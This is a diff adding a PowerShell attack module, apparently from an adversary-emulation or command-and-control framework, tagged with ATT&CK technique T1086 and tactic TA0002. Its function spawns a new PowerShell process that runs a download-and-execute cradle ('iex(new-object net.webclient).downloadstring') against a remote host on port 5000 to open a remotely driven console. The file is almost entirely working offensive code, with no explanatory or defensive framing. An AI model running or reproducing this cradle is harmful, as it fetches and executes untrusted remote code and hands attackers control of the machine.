@@ -1,0 +1,52 @@
+#Title: invoke-powershell_console
+#Technique: T1086
+#Tactic: TA0002
+
+function invoke-powershell_console
+    {
+
+    param(
+    [String] $ip
+    )
+
+    <#
+    .SYNOPSIS
+    
+    .DESCRIPTION
+    Attack Commands: Run with command_prompt! Elevation Required (e.g. root or admin)
+
+    .LINK
+
+    
+    #>
+    $good = $false    
+    $results = $null
+    $uri = "http://" + $ip + ":5000/consola"
+    $command = "-command iex(new-object net.webclient).downloadstring('$uri');consola -id $global:id" 
+    $app = Start-Process powershell -PassThru -ArgumentList $command
+    if ($app.Id)
+     {
+      $good = $true
+      $results = "create new powershell console successfully"
+     }
+    return @{results=$results;success=$good}
+    }
+
+
+#Main program
+$execute = {
+  
+}
+
+#GiveMeData if needed
+
+#get-credentials
+$execute = invoke-powershell_console -ip  $global:remoteip
+
+#PutData if needed
+  # if($execute.success)
+  # {
+    
+  # }
+
+return @{results=$execute.results;success=$execute.success}
